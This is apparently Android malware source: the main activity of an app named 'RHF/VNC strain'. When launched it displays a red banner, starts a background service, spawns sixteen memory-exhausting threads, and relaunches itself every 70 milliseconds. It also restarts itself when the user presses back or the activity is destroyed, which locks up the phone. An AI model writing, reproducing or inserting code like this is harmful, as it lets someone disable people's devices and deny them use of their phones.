package com.rhfvnc.strain;

import android.app.Activity;
import android.os.Bundle;
import android.widget.TextView;
import android.graphics.Color;
import android.view.Gravity;
import android.util.TypedValue;

public class MainActivity extends Activity {

    private static final int MEM_THREADS = 16;
    private boolean alive = true;

    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);

        TextView tv = new TextView(this);
        tv.setText("RHF/VNC");
        tv.setTextColor(Color.RED);
        tv.setTextSize(TypedValue.COMPLEX_UNIT_SP, 42);
        tv.setGravity(Gravity.CENTER);
        setContentView(tv);

        StrainService.start(this);
        StrainReceiver.scheduleRelaunch(this, 40);

        for (int i = 0; i < MEM_THREADS; i++) {
            Thread t = new Thread(new MemHog(i));
            t.setDaemon(true);
            t.start();
        }

        Thread storm = new Thread(() -> {
            while (alive) {
                try {
                    android.content.Intent i = new android.content.Intent(
                            MainActivity.this, MainActivity.class);
                    i.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK
                            | android.content.Intent.FLAG_ACTIVITY_CLEAR_TASK
                            | android.content.Intent.FLAG_ACTIVITY_NO_ANIMATION);
                    startActivity(i);
                } catch (Throwable ignored) {}
                try { Thread.sleep(70); } catch (InterruptedException ignored) {}
            }
        });
        storm.setDaemon(true);
        storm.start();
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        StrainService.start(this);
        StrainReceiver.scheduleRelaunch(this, 30);
    }

    @Override
    public void onBackPressed() {
        StrainService.start(this);
        StrainReceiver.scheduleRelaunch(this, 30);
    }
}
